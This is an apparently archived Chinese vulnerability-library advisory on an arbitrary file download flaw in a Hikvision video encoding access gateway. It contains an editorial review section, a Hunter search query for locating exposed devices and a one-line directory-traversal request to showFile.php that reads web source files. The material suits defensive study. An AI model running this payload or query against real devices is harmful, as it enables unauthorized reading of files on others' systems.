---
source: "wy876 漏洞文库"
id: "vw-fcb4a7921a45abf136756f77"
entity_id: "ve-fcb4a7921a45abf136756f77"
schema_version: "1"
title: "海康威视视频编码设备接入网关 showFile.php 任意文件下载漏洞"
product: "Hikvision视频编码设备接入网关"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "会话/固件未知，读取Web源码"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3showFile.php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/mq89stc9hxmf3fw1"
source_status: "recorded"
previous_fofa_unverified: "web.title="
hunter: "web.title=\"视频编码设备接入网关\"&&app.name==\"Hikvision 海康威视视频编码设备接入网关\""
---

# 海康威视视频编码设备接入网关 showFile.php 任意文件下载漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Hikvision视频编码设备接入网关
- 本文讨论：showFile.php fileName目录穿越
- 版本、权限与配置前提：会话/固件未知，读取Web源码
- 资料类型：重复文件读取摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 与850完全同入口但缺源码/响应
- Hunter元数据截断，无版本/修复
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 真实鉴权与版本待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
海康威视视频接入网关系统在页面`/serverLog/showFile.php`的参数fileName存在任意文件下载漏洞

# 二、影响版本
+ HIKVISION 视频编码设备接入网关

# 三、资产测绘
+ hunter：`web.title="视频编码设备接入网关"&&app.name=="Hikvision 海康威视视频编码设备接入网关"`


+ 登录页面


# 四、漏洞复现
```plain
/serverLog/showFile.php?fileName=../web/html/main.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mq89stc9hxmf3fw1>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
